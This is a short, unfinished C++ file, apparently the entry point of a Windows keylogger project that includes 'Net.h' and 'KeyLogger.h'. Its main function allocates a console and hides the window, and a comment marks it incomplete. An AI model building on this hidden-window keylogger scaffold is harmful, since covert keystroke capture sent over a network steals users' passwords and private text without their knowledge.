#include "Net.h"
#include "KeyLogger.h"

using namespace std;

int main(void) {

	HWND CurrentWindow;

	AllocConsole();

	CurrentWindow = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(CurrentWindow, 0);

	//incomplete

}